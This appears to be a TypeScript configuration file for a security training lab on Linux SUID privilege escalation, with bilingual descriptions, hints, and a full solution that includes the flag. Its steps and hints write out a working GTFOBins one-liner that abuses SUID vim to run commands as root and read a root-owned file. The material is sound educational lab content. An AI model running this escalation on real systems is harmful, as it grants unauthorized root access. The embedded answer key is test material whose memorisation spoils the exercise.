import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab2Metadata: LabMetadata = {
  slug: 'linux-lab2-suid-privesc',
  title: 'SUID Privilege Escalation',
  ar_title: 'رفع الصلاحيات عبر SUID',
  description: 'Find SUID binaries and exploit vim to read a root-owned flag file.',
  ar_description: 'أوجد ملفات SUID واستغل vim للوصول لملف الفلاج المملوك لـ root.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  executionMode: 'SHARED_BACKEND',
  skills: ['Linux', 'Privilege Escalation', 'SUID', 'GTFOBins', 'vim'],
  xpReward: 100,
  pointsReward: 100,
  duration: 25,
  isPublished: true,
  imageUrl: null,
  goal: 'Find SUID binaries, exploit vim to read /root/flag.txt as root.',
  ar_goal: 'أوجد ملفات SUID، استغل vim لقراءة /root/flag.txt بصلاحيات root.',
  flagAnswer: 'FLAG{SUID_VIM_PRIVILEGE_ESCALATION}',
  briefing: {
    story: 'You have limited shell access. The flag is in /root/flag.txt which you cannot read directly.',
    objective: 'Find a SUID binary that can be abused to read root-owned files (GTFOBins technique).',
  },
  stepsOverview: [
    { step: 1, title: 'Find SUID', description: 'find / -perm -u=s -type f' },
    { step: 2, title: 'Identify exploitable', description: 'Check GTFOBins for the found SUID binaries' },
    { step: 3, title: 'Exploit vim', description: 'vim -c ":py3 import os; os.system(\'cat /root/flag.txt\')"' },
  ],
  solution: {
    summary: 'find / -perm -u=s → /usr/bin/vim → vim GTFOBins exploit → read /root/flag.txt',
    steps: [
      'find / -perm -u=s -type f 2>/dev/null',
      'See /usr/bin/vim with SUID',
      'vim -c ":py3 import os; os.system(\'cat /root/flag.txt\')"',
      'Read FLAG{SUID_VIM_PRIVILEGE_ESCALATION}',
    ],
  },
  postSolve: {
    lesson: 'SUID on text editors is extremely dangerous. Check GTFOBins (gtfobins.github.io) for exploitation techniques.',
  },
  initialState: {},
  hints: [
    { order: 1, content: 'Use: find / -perm -u=s -type f 2>/dev/null to list all SUID binaries.', xpCost: 10 },
    { order: 2, content: 'vim has the SUID bit set. Check GTFOBins for vim exploitation.', xpCost: 20 },
    { order: 3, content: 'vim -c ":py3 import os; os.system(\'cat /root/flag.txt\')" exploits the SUID vim.', xpCost: 30 },
  ],
};
